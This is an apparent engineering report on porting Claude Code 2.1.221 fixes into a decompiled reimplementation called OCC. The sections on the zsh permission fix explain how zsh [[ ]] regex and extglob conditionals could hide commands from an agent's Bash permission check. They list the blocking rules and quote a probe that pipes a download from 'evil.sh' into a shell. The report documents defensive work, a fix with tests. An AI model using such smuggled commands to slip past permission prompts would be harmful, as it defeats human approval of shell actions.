# Upstream version gap — OCC-44 (2026-08-05)

> Carryover from `docs/upstream-version-gap-occ43.md`. Methodology per the
> `upstream-tracking` + `aligning-with-official-binary` skills (no memory
> recital, no invented/partial implementations). Version truth from the npm
> registry, the official GitHub releases, AND a fresh download of the official
> native ELF (`@anthropic-ai/claude-code-linux-x64@2.1.221`, 288,705,544
> bytes). Behavioral truth cross-checked by driving the built OCC artifact
> (`dist/cli.js`, `OCC 2.1.292` → `2.1.293` this round) and probing OCC's
> LIVE permission path side by side with the decompiled 2.1.220/2.1.221
> binaries.

## TL;DR

| Item | Value | Source |
|------|-------|--------|
| OCC own release (start of round) | `2.1.292` (OCC-43) | `package.json` |
| OCC aligned Claude Code (start of round) | `2.1.218` fully + `2.1.219` **partial** + `2.1.220` no-op | OCC-43 §6 |
| Official latest Claude Code | **`2.1.221`** — NEW, published `2026-08-03T22:16:25Z` (npm) / GitHub release `v2.1.221` `2026-08-04T00:14:23Z` | `npm view`, `gh api` |
| Version gap | **REAL GAP: `2.1.221` is a substantive release (~40 changelog entries)** | this doc §2 |
| Binary markers (fresh download) | 353 × `2.1.221`, zero `2.1.222+`; binary grew 275,012,592 → 288,705,544 bytes (+13.7 MB vs 2.1.220) | `strings` + `package.json` |
| Landed this round | **3 binary-verbatim ports**: ① 2.1.221 zsh `[[ ]]` regex-conditional permission-bypass fix (P0 security), ② `CLAUDE_CODE_RESUME_INTERRUPTED_TURN=0` falsy honored, ③ Monitor "ended without producing output" message — 27 new unit tests, all green | this doc §3 |

**Conclusion: the 11-day 2.1.220 plateau broke on 2026-08-03 — official
advanced to `2.1.221`, a large mixed feature/fix release. This round
researched the full changelog (triage in §2), binary-diffed 2.1.220↔2.1.221
(17,119 new strings), and LANDED the portable, binary-verified subset (§3).
The deep/backend-bound items stay staged with per-site rationale (§4).**

## 1. Version truth (三方 — npm + GitHub + binary)

| Source | Value | Command |
|--------|-------|---------|
| npm `latest` dist-tag | `2.1.221` | `npm view @anthropic-ai/claude-code version` |
| npm dist-tags | `latest=2.1.221`, `next=2.1.221`, `stable=2.1.220` | `npm view … dist-tags --json` |
| npm `time` tail | `2.1.219 → 2026-07-24T16:11:49Z`, `2.1.220 → 2026-07-24T23:11:21Z`, **`2.1.221 → 2026-08-03T22:16:25Z`** | `npm view … time --json` |
| Official GitHub latest release | **`v2.1.221`** (`ashwin-ant`, published `2026-08-04T00:14:23Z`) | `gh api repos/anthropics/claude-code/releases/latest` |
| Official GitHub tags (top 3) | `v2.1.221`, `v2.1.220`, `v2.1.219` | `gh api repos/anthropics/claude-code/tags` |
| Binary markers (fresh 2.1.221 ELF) | 353 × `2.1.221`; `2.1.222+` → **0 hits** | `npm pack …linux-x64@2.1.221` + `grep -aoE` |
| OCC aligned (start of round) | `2.1.218` full + `2.1.219` partial + `2.1.220` no-op | OCC-43 §6 |

## 2. `2.1.221` changelog triage (all ~40 entries)

Binary diff 2.1.220↔2.1.221: **17,119 new strings / 11,182 removed** (large
churn = substantive release). Bucket assignments below; "portable" = no
Anthropic-backend dependency, verifiable in the linux-x64 ELF, and OCC has
the surface.

### LANDED this round (§3)

| # | Changelog entry | Disposition |
|---|-----------------|-------------|
| A | **Fixed a Bash tool permission-check bypass where zsh could execute hidden commands in `[[ ]]` regex conditionals; affected commands now prompt for permission** | ✅ **P0 security** — binary `Vzu` regex/extglob case recovered verbatim, ported to `src/utils/bash/ast.ts` `walkTestExpr` (15 tests). OCC's LIVE legacy path probed: already fail-closed for the smuggled forms (`ask`), so no live OCC vulnerability; the AST-path port gives structural parity for when `TREE_SITTER_BASH` is ever enabled |
| B | **Fixed `CLAUDE_CODE_RESUME_INTERRUPTED_TURN=0` not disabling interrupted-turn auto-resume; falsy values are now honored** | ✅ binary: the print path moved from raw-string truthy to the bool-parsed env object (enabled only for `1`/`true`/`yes`/`on`, case-insensitive, trimmed). OCC's `isEnvTruthy` is byte-equivalent to the official `bool()` parser — wired into `src/cli/print.ts` (7 tests). OCC has a single resume site (print path); the official's sessionRestore/bg-respawn sites have no OCC counterpart |
| C | **Changed Monitor: a watch that exits without producing any output now says so instead of reporting "stream ended"** | ✅ binary `qZs` recovered: `completed → o===0 ? \`Monitor "…" ended without producing output (exit N)\` : \`Monitor "…" stream ended\``. Ported to `src/tasks/LocalShellTask/LocalShellTask.tsx` (`monitorCompletedSummary`; OCC's output-count signal = task output file size post-flush). Note: OCC's `MonitorTool` currently streams via a side-channel emitter and does not route through LocalShellTask notifications — this aligns the structural path (5 tests) |

### STAGED — need dedicated per-site decompilation or missing OCC surface

| Changelog entry | Why staged |
|-----------------|------------|
| Added `mode: "mask"` for sandbox credential files on Linux/WSL (sentinel-copy + egress substitution; macOS falls back to `deny`) | Confirmed FULL implementation in the 2.1.221 binary (zod `.describe()` texts, `injectHosts`, `extract` regex, sentinel substitution, glob-spelled-mask drop, disabled-user-mask warnings — all recovered as strings). But it is deeply coupled to the sandbox proxy egress path; OCC enforces sandbox policy OCC-side (OCC-39 precedent: `sandbox-runtime@0.0.44` schema strips unknown fields). Needs a dedicated round with the proxy surface recovered before any port — not guessed |
| Added warnings to `claude plugin validate` for Claude-Desktop managed-marketplace-sync names; `/plugin install` stale-catalog retry; plugins activate immediately when safe; plugins accept `"."` as `skills` path | OCC's plugin/marketplace subsystem is a trimmed surface (CLAUDE.md "Plugins / Marketplace removed"; OCC ships UI scaffolding only). Un-stubbing the plugin lifecycle exceeds faithful-alignment scope |
| Added a `prompt-audit` subcommand to the `claude-api` skill | Pure skill-content addition (new `prompt-audit.md`, 11 new string hits — 0 in 2.1.220). OCC's bundled `claude-api` skill **.md files are intentional 1-byte stubs from the initial commit** (content trimmed by design; only the model-var table in `claudeApiContent.ts` is maintained). Adding content to a trimmed skill = inventing surface — staged per skill discipline |
| [VSCode] Focus view (`Ctrl+Alt+F`) | VSCode-extension-only — skip per version-selection rules |
| Fixed PowerShell permission checks mishandling paths with quote characters; Improved Windows startup (native kernel32 process-creation read) | Windows-only; OCC tracks the linux/macOS surface |
| Fixed the thinking toggle having no effect for the rest of a session that started with thinking off; disabling an MCP server mid-connect no longer silently reverts | Two distinct REPL/MCP-lifecycle fixes; each needs its own decompilation of the thinking-toggle state machine / MCP connect lifecycle. Staged |
| Fixed MCP servers from `--mcp-config` not being connected before the first turn in print mode (`-p`) | OCC wires `--mcp-config` via `dynamicMcpState` merged per-turn in `print.ts`; whether OCC's first-turn connection ordering has the same race needs a live MCP-server e2e probe (staged as VERIFY-NEXT-ROUND — see §4 note) |
| Fixed @-mentioned files being silently dropped when pressing Esc to retract and resubmit | REPL prompt-input internals; needs PromptInput retract-path decompilation |
| Fixed a crash when preparing API requests for SDK MCP tools named after built-in object properties such as `constructor` | OCC's main tool lookup is array-based (`findToolByName` → `.find()`), structurally immune to the `Object.prototype` hazard; the SDK-MCP-specific request-prep site needs a dedicated probe. Staged as verify-only |
| Fixed WebSearch failing with a 400 error at effort `xhigh`/`max` when thinking is disabled | Request-builder effort/thinking interplay; OCC's WebSearch surface is flag-gated/trimmed — needs surface verification first |
| Fixed sandboxed large uploads failing with TLS errors through the sandbox proxy | Sandbox-proxy-bound (same coupling as `mode: "mask"`) |
| Fixed Team/Enterprise spend-limit message blaming the wrong limit | Account-plan/backend message; needs the spend-limit message site recovered |
| Fixed Bedrock auth with AWS SSO named profiles on Windows with a stray `HOME` | Bedrock+Windows-specific |
| Fixed a rare wake-from-sleep race refreshing the same MCP connector / WIF OAuth token twice | OAuth-refresh concurrency; OCC's MCP OAuth is simplified (CLAUDE.md) — needs OCC surface verification |
| Fixed renaming a session from Desktop/claude.ai not updating the CLI session name; session names sanitized everywhere | Desktop/claude.ai bridge surface; OCC has no Desktop bridge |
| Fixed plugin/org skills named after terminal-only built-ins un-invocable non-interactively | Plugin-skill surface (trimmed in OCC) |
| Fixed "Plugins changed" notification lingering | Plugin surface |
| Fixed Vim mode: yank register survives dialogs/history/transcript; undo-to-empty arms the ← confirm | OCC ships no Vim mode (2.1.219 P3 Vim items already staged) |
| Improved tool search on Google Vertex AI (re-enabled for Claude-4.5-gen+) | Vertex-backend-bound |
| Improved auto mode: cache-efficient parallel permission checks; stale pending-check no longer applied after mode switch; reduced prompt-cache costs reusing the cached prefix | Auto-mode classifier/backend request economics — classifier calls go to the Anthropic backend; OCC's auto mode runs the classifiers but the caching economics are backend-side |
| Improved Stats panel to count cache tokens with breakdown | Stats-panel TUI; needs the panel's site recovered |
| Improved `/ultrareview` error messages (no-shared-history refusal advice) | `/ultrareview` is not an OCC surface |
| Changed background sessions: commit+push to preserve work, draft PR only when asked, follow CLAUDE.md git instructions, report where work lives | OCC background sessions use the self-built daemon supervisor (by-design `--bg` divergence, CLAUDE.md OCC-21); behavior parity needs the daemon-session lifecycle mapping first |
| Changed `/status` to show the session kind (`interactive` / `background job · attached|unattended`) | Binary row recovered verbatim: `{label:"Session kind",value:!ps()?"interactive":hO()?"background job · unattended":"background job · attached"}`. OCC's `/status` (Settings→Status tab) has no such row, and the `· attached` value requires session-side **attacher state** OCC does not track (`isBgSession()` exists; nothing marks a bg session attached). Staged rather than inventing attacher detection — the faithful subset (`interactive` vs `background job · unattended`) is a 3-line follow-up once the attached-state question is resolved |
| Changed emoji autocomplete to accept `:thumbsup:` / `:thumbsdown:` / `:love:` | PromptInput autocomplete table; small but needs the emoji-shortcode table site recovered |
| Changed `/fork` to create a new worktree of its own | OCC has `src/commands/fork`; the worktree-creation change needs that path decompiled |
| Changed Claude in Chrome to close tabs it no longer needs | Chrome-integration surface (OCC's WebBrowser tool is OCC-specific) |
| Changed fast mode to report usage-credit exhaustion on the stream | Account/credit backend surface |
| Changed Gateway `model` field validation: non-string → 400 | Gateway surface; OCC's gateway support is minimal — needs verification |
| Removed the repeated "Permission mode changed while the auto-mode classifier call was queued" notice | Auto-mode classifier UI notice; needs the notice site recovered |

## 3. Landed this round (binary-verbatim, unit-verified)

### 3a. 2.1.221 P0 security fix — zsh `[[ ]]` regex conditional guards

Recovered verbatim from the 2.1.221 ELF (test-expression RHS case, the
function surrounding `case"regex":case"extglob_pattern"`):

- **both node types**: reject when the node text matches
  `/\$[({[\w#?!*@$'"+~^=-]|`|[<>]\(/` →
  `[[ ]] <type> contains expansion / command / process substitution`
  (present in 2.1.220 too; OCC's ast.ts had NEITHER this nor the 221 checks —
  the whole case block now matches 2.1.221).
- **`extglob_pattern`** (NEW 2.1.221): unquoted `&` scan (backslash-escape
  aware) → `[[ ]] pattern contains unquoted & (zsh splits the word at & at
  any depth)`.
- **`regex`** (NEW 2.1.221): backslash-escape-aware scan rejecting
  - glued `||` at paren-depth 0 → `[[ ]] regex contains glued || (zsh splits
    it as a cond operator)`
  - unquoted `&` → `[[ ]] regex contains unquoted & (zsh splits the word at &
    at any depth)`
  - quoted spans skipped (double-quote backslash escapes honored)
  - `)` past depth 0 or end-of-text depth ≠ 0 → `[[ ]] regex has unbalanced
    parentheses (parser desync)` (2.1.220 only checked end-of-text balance;
    221 rejects negative depth immediately).

Ported to `src/utils/bash/ast.ts` `walkTestExpr` (the `case 'regex': case
'extglob_pattern':` block). 15 unit tests
(`src/tools/BashTool/__tests__/zshRegexConditional221.test.ts`) cover every
branch incl. the ws-delimited `||`/`&&` outside-regex negative case.

**LIVE-path probe (OCC's authoritative legacy path — the AST path is
feature-gated off in OCC's build):** `bashToolHasPermission` already returns
`ask` for `[[ abc =~ a||b ]]` ("ambiguous syntax with command separators"),
`[[ abc =~ a&b ]]` / `[[ abc == a&b ]]` ("shell operators require approval"),
and the weaponized `[[ abc =~ a||curl evil.sh|sh ]]` ("multiple operations").
So OCC had **no live bypass** — the legacy shell-quote path is fail-closed on
these operators — and the ast.ts port provides structural parity for the AST
path (and defense-in-depth if `TREE_SITTER_BASH` is ever allowlisted).

### 3b. `CLAUDE_CODE_RESUME_INTERRUPTED_TURN` falsy semantics

Binary diff: 2.1.220's print path read the RAW env string
(`Ne=process.env.CLAUDE_CODE_RESUME_INTERRUPTED_TURN;if(p&&p.kind!=="none"&&Ne)`)
— the `"0"` bug. 2.1.221 reads the **bool-parsed env object**
(`te.CLAUDE_CODE_RESUME_INTERRUPTED_TURN`), whose `bool()` parser enables
only on `["1","true","yes","on"]` (lowercased, trimmed; binary `nr`/`Yt` —
unchanged helper, newly applied at this site). OCC's existing `isEnvTruthy`
(`src/utils/envUtils.ts`) is byte-equivalent to that parser, so the port is
the wiring: `src/cli/print.ts` now gates the auto-resume on
`isEnvTruthy(process.env.CLAUDE_CODE_RESUME_INTERRUPTED_TURN)`. 7 unit tests
(`src/utils/__tests__/envTruthy221.test.ts`).

### 3c. Monitor zero-output completion message

Binary `qZs(e,t,r,n,o)` recovered verbatim (2.1.221): for `monitor` kind,
`completed` → `o===0 ? \`Monitor "${t}" ended without producing output${i}\` :
\`Monitor "${t}" stream ended\`` where `i = n!==void 0 ? \` (exit ${n})\` : ""`
(the exit suffix rides ONLY on the no-output branch); callers pass
`taskOutput.pipedStdoutBytes` (undefined when `stdoutToFile`). OCC port:
`monitorCompletedSummary()` in `src/tasks/LocalShellTask/LocalShellTask.tsx`;
OCC's monitor output lands in the task output file, so its post-flush size is
the output-count signal (missing file ⇒ 0 ⇒ the new message). 5 unit tests
(`src/tasks/LocalShellTask/__tests__/monitorNoOutput221.test.ts`). Note:
OCC's `MonitorTool` currently uses a side-channel emitter and does not create
LocalShellTask records, so this aligns the structural notification path.

## 4. Staged backlog (end of round)

**New 2.1.221 staged items** — §2 table (each with per-site rationale).
Most-natural next-round follow-ups:
1. `--mcp-config` first-turn connection ordering in `-p` (VERIFY: live MCP
   server + `-p` probe against both binaries).
2. `/status` Session-kind row — resolve the `· attached` attacher-state
   question first (daemon-side signal?), then land the faithful subset.
3. Sandbox `mode: "mask"` — dedicated decompilation round (proxy egress).

**Carried from 2.1.219 (unchanged from OCC-43 §4):** item 5
`workflowSizeGuideline`, item 6 nested-subagent forwarding, item 7 `-p`
keep-answer on mid-stream API error, item 8 mcp-list error-text format, item
19 managed-MCP `${VAR}`, Vim/screen-reader P3 + niche P4, OCC-37 staged
sub-items, per-command `strictAllowlist` merge, §2b picker residuals (a)–(e).

**Self-acceptance observation (pre-existing, NOT a 2.1.221 item):** the
`repl-interactive` e2e "Shift+Tab shows the auto-mode opt-in dialog" test
fails identically with AND WITHOUT this round's changes (verified via
git-stash A/B: 2 pass / 1 fail both ways). The REPL cycles bypass → auto →
manual → acceptEdits → plan without ever showing the "Enable auto mode?"
dialog under the seeded fresh HOME. Whether the official 2.1.221 REPL shows
the dialog on that exact bypass-start carousel needs a side-by-side official
REPL probe — recorded as a gap candidate for the next self-acceptance round,
not silently ignored.

## 5. Verification gates this round

- New unit tests: **27 pass / 0 fail** (15 zsh-regex + 7 envTruthy + 5
  monitorNoOutput).
- Full `src/` unit suite: **1734 pass / 0 fail / 3808 expect()** (was
  1707/0 before this round's +27).
- Affected suites isolated: BashTool + LocalShellTask + envTruthy — **277
  pass / 0 fail / 431 expect()**.
- e2e: `version-2.1.219-*` 5 files **43 pass / 0 fail / 153 expect()**;
  `occ-versioning` + `commands-alignment` + `mcp-server-errors-wiring`
  **12 pass / 0 fail / 37 expect()**; `repl-interactive` 2 pass / 1 fail
  (pre-existing, §4).
- Live smoke (built artifact + live API key): `occ --version` → `OCC 2.1.292`;
  `echo "Reply with exactly the word PONG" | occ -p` → `PONG`, exit 0;
  tmux REPL boot → welcome + model line + `● high · /effort` + shift+tab
  status line green.
- biome: changed files clean (the 4 pre-existing `CONTROL_CHAR_RE` errors in
  `ast.ts:254` are decompilation noise, unchanged, bypassed per repo
  convention).
- Build green: `dist/cli.js` 28.85 MB.

## 6. Release decision

Real code landed → new OCC release **`2.1.293`** prepared, **gated on 验收员
acceptance** (issue 发版流程: 验收通过后打 tag → `publish.yml` → npm + GitHub
Release). Until acceptance: code merges to `main` without tagging.

## 7. Tracked-upstream pointer (end of round)

- `2.1.218` — fully aligned (OCC-31).
- `2.1.219` — partial (P0 + Opus 5 canonical + 1a–1j + items 4/8-ws/1c/2;
  remaining P1–P4 staged §4).
- `2.1.220` — no-op reliability layer.
- `2.1.221` — **partial**: the portable binary-verified subset landed this
  round (P0 zsh security fix + resume-turn falsy + Monitor no-output message);
  the rest staged with per-site rationale (§2/§4).

Next round: re-check npm for `2.1.222+`; otherwise continue the staged
backlog — first the §4 follow-ups (MCP first-turn verify, `/status` session
kind, sandbox mask decompilation), then the carried 2.1.219 items.
